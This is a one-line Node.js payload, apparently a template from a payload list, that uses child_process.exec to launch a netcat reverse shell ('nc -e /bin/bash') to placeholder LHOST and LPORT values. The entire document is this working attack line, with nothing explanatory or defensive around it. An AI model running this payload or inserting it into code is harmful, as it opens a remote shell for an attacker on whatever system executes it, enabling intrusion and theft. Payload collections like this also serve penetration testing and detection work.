require('child_process').exec('nc -nv {{ LHOST }} {{ LPORT }} -e /bin/bash')
